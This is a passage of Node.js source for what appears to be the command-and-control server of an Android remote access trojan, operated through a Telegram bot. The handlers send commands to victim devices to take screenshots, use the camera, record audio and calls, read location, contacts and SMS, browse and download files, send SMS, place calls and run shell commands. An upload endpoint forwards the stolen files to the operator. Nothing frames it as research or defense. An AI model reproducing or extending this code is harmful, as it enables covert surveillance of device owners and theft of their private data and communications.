            deviceId = parts.slice(2).join('_');
            sendCommandToDevice(deviceId, 'record_audio', { seconds }, chatId);
            await bot.sendMessage(chatId, `🎤 Recording ${seconds}s...`).catch(()=>{});
        }
        // Handle all other actions
        else {
            switch(action) {
                case 'info':
                    sendCommandToDevice(deviceId, 'get_device_info', {}, chatId);
                    bot.sendMessage(chatId, `ℹ️ Getting info...`).catch(()=>{});
                    break;
                    
                case 'apps':
                    sendCommandToDevice(deviceId, 'list_apps', {}, chatId);
                    bot.sendMessage(chatId, `📱 Getting apps...`).catch(()=>{});
                    break;
                    
                case 'screenshot':
                    sendCommandToDevice(deviceId, 'take_screenshot', {}, chatId);
                    bot.sendMessage(chatId, `📸 Taking screenshot...`).catch(()=>{});
                    break;
                    
                case 'camera':
                    await bot.sendMessage(chatId, `📷 Select camera:`, {
                        reply_markup: cameraMenu(deviceId).reply_markup
                    }).catch(()=>{});
                    break;
                    
                case 'record':
                    await bot.sendMessage(chatId, `🎤 Select duration:`, {
                        reply_markup: recordMenu(deviceId).reply_markup
                    }).catch(()=>{});
                    break;
                    
                case 'location':
                    sendCommandToDevice(deviceId, 'get_location', {}, chatId);
                    bot.sendMessage(chatId, `📍 Getting location...`).catch(()=>{});
                    break;
                    
                case 'files':
                    setUserSession(chatId, { state: 'awaiting_files_path', deviceId });
                    await bot.sendMessage(chatId, `📁 Enter path (e.g., /sdcard):`, {
                        reply_markup: removeKeyboard.reply_markup
                    }).catch(()=>{});
                    break;
                    
                case 'download':
                    setUserSession(chatId, { state: 'awaiting_download_path', deviceId });
                    await bot.sendMessage(chatId, `📥 Enter file path to download:`, {
                        reply_markup: removeKeyboard.reply_markup
                    }).catch(()=>{});
                    break;
                    
                case 'call':
                    setUserSession(chatId, { state: 'awaiting_call_number', deviceId });
                    await bot.sendMessage(chatId, `📞 Enter phone number:`).catch(()=>{});
                    break;
                    
                case 'sms':
                    setUserSession(chatId, { state: 'awaiting_sms_number', deviceId });
                    await bot.sendMessage(chatId, `💬 Enter phone number:`).catch(()=>{});
                    break;
                    
                case 'contacts':
                    sendCommandToDevice(deviceId, 'list_contacts', {}, chatId);
                    bot.sendMessage(chatId, `📒 Getting contacts...`).catch(()=>{});
                    break;
                    
                case 'messages':
                    sendCommandToDevice(deviceId, 'get_messages', {}, chatId);
                    bot.sendMessage(chatId, `📨 Getting messages...`).catch(()=>{});
                    break;
                    
                case 'shell':
                    setUserSession(chatId, { state: 'awaiting_shell_command', deviceId });
                    await bot.sendMessage(chatId, `🖥️ Enter shell command:`).catch(()=>{});
                    break;
                    
                case 'paths':
                    sendCommandToDevice(deviceId, 'check_paths', {}, chatId);
                    bot.sendMessage(chatId, `📂 Checking accessible paths...`).catch(()=>{});
                    break;
                    
                case 'record_call':
                    sendCommandToDevice(deviceId, 'start_call_recording', {}, chatId);
                    bot.sendMessage(chatId, `📞 Starting call recording...`).catch(()=>{});
                    break;
                    
                case 'stop_call':
                    sendCommandToDevice(deviceId, 'stop_call_recording', {}, chatId);
                    bot.sendMessage(chatId, `⏹️ Stopping call recording...`).catch(()=>{});
                    break;
                    
                case 'notify':
                    setUserSession(chatId, { state: 'awaiting_notification_title', deviceId });
                    await bot.sendMessage(chatId, `🔔 Enter notification title:`).catch(()=>{});
                    break;
            }
        }
    });
}

// ============================================
// SESSION MANAGEMENT
// ============================================
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

// ============================================
// API ENDPOINTS
// ============================================
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        const fileType = req.headers['file-type'] || 'file';
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing data' });
        }
        
        if (bot) {
            await bot.sendDocument(adminId, req.file.path, {
                caption: `📁 ${fileType}\nDevice: ${deviceId.substring(0,6)}...\nSize: ${(req.file.size / 1024 / 1024).toFixed(2)}MB`
            }).catch(()=>{});
            
            setTimeout(() => {
                if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
            }, 60000);
        }
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// ============================================
// FORMAT BYTES HELPER
// ============================================
function formatBytes(bytes) {
    if (!bytes) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// ============================================
// START SERVER
// ============================================
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n🚀 DMA Server');
    console.log('━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📡 Port: ${PORT}`);
    
    bot = await startBot();
    
    console.log(`🤖 Bot: ${bot ? '✅ Connected' : '❌ Failed'}`);
    console.log(`📱 Commands: 24 registered`);
    console.log(`🔄 Keep-alive: Active (5s ping, 12h server)`);
    console.log('━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    console.log('\n🛑 Shutting down...');
    if (bot) await bot.stopPolling();
    wss.close(() => server.close(() => process.exit(0)));
}

module.exports = { app, server, wss, connectedDevices };
